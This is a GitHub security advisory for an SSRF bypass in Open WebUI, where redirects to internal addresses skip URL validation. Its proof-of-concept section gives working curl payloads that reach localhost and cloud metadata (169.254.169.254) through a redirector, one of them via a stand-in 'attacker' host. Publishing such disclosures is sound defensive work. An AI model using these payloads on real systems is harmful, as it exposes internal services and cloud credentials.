# [H] Open WebUI has a SSRF Bypass via HTTP Redirect Following in Web-Fetch and Image-Load Endpoints (not addressed by CVE-2025-65958)

## Summary
Severity: High
Advisory: GHSA-rh5x-h6pp-cjj6
CVE: CVE-2026-45401
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-rh5x-h6pp-cjj6
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
# Server-Side Request Forgery (SSRF) Bypass via HTTP Redirect Following in Web-Fetch, Image-Load, and Chat-Completion Endpoints

## Summary

The `validate_url()` function in `backend/open_webui/retrieval/web/utils.py` only validates the *initial* URL submitted by the caller. The HTTP clients used downstream (sync `requests`, async `aiohttp`, langchain's `WebBaseLoader`) follow HTTP 3xx redirects by default and do **not** re-validate the redirect target against the private-IP / metadata-IP block list. Any authenticated user can therefore submit a public URL that 302-redirects to an internal address (e.g. `127.0.0.1`, `169.254.169.254`, RFC1918) and read the internal response body via the `/api/v1/retrieval/process/web` endpoint, the `/api/v1/images/...` endpoints, the `/api/chat/completions` endpoint with an `image_url` content part, and any other route that calls these helpers.

## Affected code paths

The bypass exists across multiple call sites; each independently follows redirects without re-validation.

### Path 1 — sync `_scrape` via `SafeWebBaseLoader`

`backend/open_webui/retrieval/web/utils.py` — `SafeWebBaseLoader` inherits from `langchain_community.document_loaders.WebBaseLoader`. The parent's `_scrape()` calls `self.session.get(url, **self.requests_kwargs)`. `requests_kwargs` only sets `timeout`; `allow_redirects=False` is **not** passed, so `requests.Session.get()` follows redirects with the default `allow_redirects=True`. `validate_url()` is invoked once on the original URL only.

### Path 2 — async `_fetch` (aiohttp)

`backend/open_webui/retrieval/web/utils.py` — `_fetch()` previously inherited the aiohttp default `allow_redirects=True`. As of HEAD this path is fixed (`allow_redirects=False`). Listed for completeness.

### Path 3 — `get_content_from_url` (sync `requests.get`)

`backend/open_webui/retrieval/utils.py` — `response = requests.get(url, stream=True, timeout=30)`. No `allow_redirects=False`. Reached via `/api/v1/retrieval/process/web` (file ingestion) and other routers that resolve external URLs.

### Path 4 — `load_url_image` (image edit)

`backend/open_webui/routers/images.py` — image-URL fetching helper used by the image-edit endpoint. Same pattern: `validate_url()` checks only the initial URL, the underlying HTTP client follows redirects without re-validation. Reachable via `/api/v1/images/edit`.

### Path 5 — `get_image_base64_from_url` (chat-completion image inlining)

`backend/open_webui/utils/files.py` — `get_image_base64_from_url()` is invoked from `convert_url_images_to_base64()` in `backend/open_webui/utils/middleware.py` on every `/api/chat/completions` request whose message content includes an `image_url` part. The shared aiohttp session pool (`backend/open_webui/utils/session_pool.py`) does not override the aiohttp default `allow_redirects=True`, and the call site itself does not pass `allow_redirects=False`. This is the most reachable variant in the cluster: no special endpoint, no admin permission, no feature flag — any authenticated user can trigger it from a normal chat message.

## Proof of concept

Authenticated low-privilege user; default config, no admin or special permissions required.

```bash
curl -X POST https://<target>/api/v1/retrieval/process/web \
  -H "Authorization: Bearer <any_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "https://httpbin.org/redirect-to?url=http%3A%2F%2Flocalhost%3A8080%2Fapi%2Fconfig&status_code=302"}'
```

Response body contains the internal `/api/config` payload in `file.data.content`. Replace the redirect target with `http://169.254.169.254/latest/meta-data/` for cloud metadata, or any internal hostname reachable from the server.

For the chat-completion path (Path 5), the same redirect is followed when an `image_url` content part points to an attacker-controlled redirector:

```bash
curl -X POST https://<target>/api/chat/completions \
  -H "Authorization: Bearer <any_user_token>" \
  -H "Content-Type: application/json" \
  -d '{"model":"any","messages":[{"role":"user","content":[{"type":"text","text":"x"},{"type":"image_url","image_url":{"url":"http://attacker/redirect-to-imdsv1"}}]}]}'
```

## Impact

Any authenticated user can read GET responses from any HTTP service reachable by the Open WebUI server process — cloud metadata services (IMDSv1 if available), localhost-bound application APIs, internal databases / monitoring / Kubernetes services, and VPN-bridged on-premise networks.

## Recommended fix

For every call site that follows redirects, set `allow_redirects=False` on the underlying HTTP client and add a per-hop validation loop using `validate_url()` on each `Location:` header.

## Credits

Per the consolidation rule in SECURITY.md, credit goes only to reporters who FIRST identified a distinct sub-path that no earlier filing covered.

- **tenbbughunters** — first to identify SafeWebBaseLoader sync `_scrape` (Path 1)
- **YLChen-007** — first to identify `load_url_image` (Path 4)
- **tempcollab** — first to identify aiohttp `_fetch` (Path 2)
- **sneaXOR** — first to identify `get_content_from_url` (Path 3)
- **nayakchinmohan** — first to identify `get_image_base64_from_url` in chat-completion middleware (Path 5)

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-rh5x-h6pp-cjj6
- https://nvd.nist.gov/vuln/detail/CVE-2026-45401
- https://github.com/advisories/GHSA-c6xv-rcvw-v685
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
